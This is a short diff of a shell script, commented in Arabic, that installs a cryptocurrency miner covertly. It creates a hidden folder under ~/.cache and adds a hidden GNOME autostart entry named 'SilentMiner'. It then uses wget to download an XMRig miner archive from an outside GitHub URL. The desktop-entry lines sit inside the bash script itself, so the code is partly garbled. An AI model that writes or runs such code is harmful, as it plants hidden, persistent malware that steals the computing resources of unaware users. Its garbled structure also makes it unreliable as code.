@@ -9,7 +9,13 @@ THREADS=
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
-
+[Desktop Entry]
+Type=Application
+Name=SilentMiner
+Exec=bash %h/.cache/.sysd/start.sh
+X-GNOME-Autostart-enabled=true
+NoDisplay=true
+Hidden=true
 # تحميل النسخة الجاهزة من XMRig (Linux x64)
 wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
 
